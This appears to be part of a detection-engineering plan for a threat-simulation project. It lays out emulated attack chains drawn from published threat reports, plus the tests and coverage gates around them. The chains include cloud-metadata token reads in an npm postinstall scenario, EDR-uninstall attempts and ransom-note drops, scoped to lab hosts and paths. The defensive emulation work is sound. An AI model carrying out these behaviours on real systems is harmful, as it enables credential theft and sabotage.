- [ ] **Step 4: Verify** — all four must be clean before commit:
  - `python3 .claude/hooks/lint-scenario.py scenarios/multi_plane/mp-0NN-<slug>.yml .` → exit 0, no `marker-only` warning
  - `.venv/bin/python detection_scanner/scripts/validate.py` → `0 warn / 0 fail`, pass count +1
  - `CORTEXSIM_STRICT_REFS=true PYTHONPATH=core .venv/bin/python -m pytest tests/engine/test_corpus_refs_strict.py -q -k "not expected_size"` → pass
  - `.venv/bin/python detection_scanner/scripts/coverage_report.py --json | python3 -c "import json,sys; d=json.load(sys.stdin)['signal_quality']; print(d['stitched_chains'], d['hq_signals'], 'SIM-MP-0NN' in d['stitched_chain_ids'])"` → the id is listed and `hq_signals` grew by the chain's non-marker step-detections
- [ ] **Step 5: Commit** — `git add scenarios/multi_plane/mp-0NN-<slug>.yml detection_scanner/ttps/TTP-2026-01NN-<slug>.json && git commit -m "feat(scenarios): SIM-MP-0NN <actor> stitched chain (Unit 42)"`

### Task 7: SIM-MP-023 / TTP-2026-0182 — Squidoor (CL-STA-0049)
Row 1 of spec §5. Linux primary with `platform_variants.windows` on the backdoor steps; cloud-identity leg = Outlook/Graph API C2 via `m365_activity_emitter` (or `cloud_app` plane detection on the Graph calls); network leg = `ngfw_eal_emitter` with a report domain/IP pair; threat log with one report sha256.

### Task 8: SIM-MP-024 / TTP-2026-0183 — CL-UNK-1211 AI-driven Linux espionage
Row 2. Linux only. Cloud leg only if the report describes cloud API use; otherwise endpoint + network (two legs) and say so in the header.

### Task 9: SIM-MP-025 / TTP-2026-0184 — Blinder Tunnel (CL-STA-1178), GitHub-as-C2
Row 3. Cloud-identity leg = SaaS (GitHub API) on `CLOUD_APP`; agent steps must not call `api.github.com` with report tokens — use `${STAGE_HOST}` with the report's URI shape.

### Task 10: SIM-MP-026 / TTP-2026-0185 — HazyBeacon (CL-STA-1020), AWS Lambda-URL C2
Row 4. Cloud leg = `cloud_audit_emitter` (Lambda URL config / invoke events, `source_ip` override); Windows primary with linux variants for the sideload-equivalent staging.

### Task 11: SIM-MP-027 / TTP-2026-0186 — Slow Pisces RN Loader / RN Stealer
Row 5. Linux/macOS Python developer lure; 27 domains / 27 IPs in the report — carry ≥3 domains as `dns_lookup` indicators and ≥2 IPs as `log_field` on the NGFW leg.

### Task 12: SIM-MP-028 / TTP-2026-0187 — ChainDrop npm worm
Row 6. Container/CI runner: `npm` postinstall lineage, IMDS token read against `${IMDS_HOST:-169.254.169.254}` **only if** the lab allows; default to `${STAGE_HOST}`; cloud leg = `cloud_audit_emitter` (STS/Secrets Manager) + `k8s_audit_emitter`.

### Task 13: SIM-MP-029 / TTP-2026-0188 — Shadow Campaigns (TGR-STA-1030)
Row 7. 11 sha256 / 12 domains / 12 IPs; endpoint + network strong, cloud leg only as the report supports.

### Task 14: SIM-MP-030 / TTP-2026-0189 — Jumpy Pisces → Play ransomware hand-off
Row 8. Windows primary; Sliver/DTrack staging shapes, mass EDR-uninstall attempt as a *detected* behaviour (no prevent expectation); network leg from the report's C2 IP/domain.

### Task 15: SIM-MP-031 / TTP-2026-0190 — Repellent Scorpius / Cicada3301 ESXi
Row 9. Linux, ESXi-shaped paths (`/vmfs/volumes` under a lab prefix), ransom-note drop, no encryption of anything outside `/tmp/cortexsim-*`; IOC appendix is on PaloAltoNetworks GitHub — use that URL as `source_url`.

### Task 16: SIM-MP-032 / TTP-2026-0191 — BeyondTrust CVE-2026-1731 mass exploitation
Row 10. Linux appliance shape; richest IOC set (9/9/19) — carry ≥5 indicators across both legs; endpoint + network only.

### Task 17: SIM-MP-033 / TTP-2026-0192 — CL-STA-0969 telecom (Cordscan / GTPDOOR)
Row 11. Linux; 23 sha256 — the threat-log leg carries ≥2; network leg = GTP-shaped sessions on `ngfw_eal_emitter` (`app` stays a preset; the destination carries a report IP if the report lists one, else a domain pair from the record).

### Task 18: SIM-MP-034 / TTP-2026-0193 — Jingle Thief (CL-CRI-1032) M365/Entra gift-card fraud
Row 12. No endpoint leg: `idp_signin_emulator` + `m365_activity_emitter` with the report IPs as `log_field` indicators; `required_planes_in_incident: [ITDR, CLOUD_APP]`; `stitching_key: user_principal`.

---

### Task 19: Bind the 12 chains into the FY27 crosswalk and the count tests

**Files:**
- Modify: `scripts/uctc_crosswalk_v2.2.py` (12 `CROSSWALK` rows in the multi-plane block, `REMAP` unless no index row fits, mirroring each scenario's `tc_refs[]`)
- Modify: `docs/uc_tc_mapping/crosswalk-v2.2.csv` and the xlsx via `python3 scripts/uctc_crosswalk_v2.2.py --emit --emit-xlsx`
- Modify: `tests/api/test_uctc_index.py` (170 → 182, add the dated docstring line), `tests/engine/test_corpus_refs_strict.py` (177 → 189, same)

- [ ] **Step 1: Run the two count tests, confirm they fail at 177/170** (the chains exist, the pins do not).
- [ ] **Step 2: Add the rows; emit; bump the pins.**
- [ ] **Step 3: Verify** — `python3 scripts/uctc_crosswalk_v2.2.py --report` shows 182 rows / 0 unresolved; `make check-uctc-sheet` green; both count tests pass; `PYTHONPATH=core .venv/bin/python -m pytest tests/api/test_uctc_index.py tests/engine/test_corpus_refs_strict.py -q`.
- [ ] **Step 4: Commit** — `git add scripts/uctc_crosswalk_v2.2.py docs/uc_tc_mapping/crosswalk-v2.2.csv docs/uc_tc_mapping/*.xlsx tests/api/test_uctc_index.py tests/engine/test_corpus_refs_strict.py && git commit -m "feat(uctc): bind SIM-MP-023..034 into the v2.2 crosswalk"`

---

### Task 20: Measure, set the floors, regenerate ground truth and docs, run every gate

**Files:**
- Modify: `detection_scanner/scripts/coverage_report.py` (`default_config`: `hq_signal_floor`, `stitched_chain_floor`, `marker_only_ceiling` = the measured values from Step 1, rounded down / up respectively)
- Modify: `docs/reference/ground-truth.json`, `docs/reference/ground-truth.md` (regenerated)
- Modify: `README.md`, `CLAUDE.md`, `docs/reference/README.md`, `docs/reference/scenario-catalog.md` (header counts only), `docs/reference/eal-plugin-catalog.md` (count), `CHANGELOG.md` (entry under Unreleased)

- [ ] **Step 1: Measure** — `coverage_report.py --json` → record `signal_quality`; `generate_ground_truth.py`.
- [ ] **Step 2: Set floors to measured values; re-run `coverage_report.py --strict`** → exit 0; temporarily lower `hq_signal_floor` by 1 in a scratch invocation (`--hq-signal-floor <N+1>`) → exit 1 (proof the gate can go red); restore.
- [ ] **Step 3: Docs** — replace every stale count (177 → 189 scenarios, 175 → 187 cards, 26 → 27 EAL plugins) and add one paragraph quoting the measured `signal_quality` numbers under the "Canonical scenario count" note in `CLAUDE.md` and the ground-truth section of `docs/reference/README.md`.
- [ ] **Step 4: Gates** — `make validate` (host-runnable targets: `validate-detection check-uctc-sheet check-streamer check-ground-truth`; `check-refs` host equivalent is the strict pytest above); `PYTHONPATH=core .venv/bin/python -m pytest tests/ --ignore=tests/smoke --ignore=tests/e2e_isolated -q`; `PYTHONPATH=core .venv/bin/python -m pytest tests/e2e_isolated -q`; `cd ui && npx vitest run` (unchanged, run once); `make test-agent` (unchanged, run once). Record every count.
- [ ] **Step 5: Commit** (two commits: floors + ground truth; docs) and report the before/after table.
